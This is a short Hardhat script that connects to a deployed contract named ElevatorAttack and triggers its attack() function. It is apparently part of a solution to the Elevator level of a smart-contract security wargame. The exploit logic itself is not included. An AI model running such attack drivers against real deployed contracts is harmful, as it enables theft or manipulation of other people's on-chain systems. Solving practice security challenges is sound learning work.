const { ethers } = require("hardhat");

const ATTACKER_ADDRESS = "0x859E4C9117bDBaf01ef02694FA3BEA89cF6285Be";

async function main() {
    const elevatorAttacker = await ethers.getContractAt("ElevatorAttack", ATTACKER_ADDRESS);

    
    // Execute the attack transaction.
    const attackTx = await elevatorAttacker.attack();
    const txReceipt = await attackTx.wait();
    console.log(txReceipt);

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});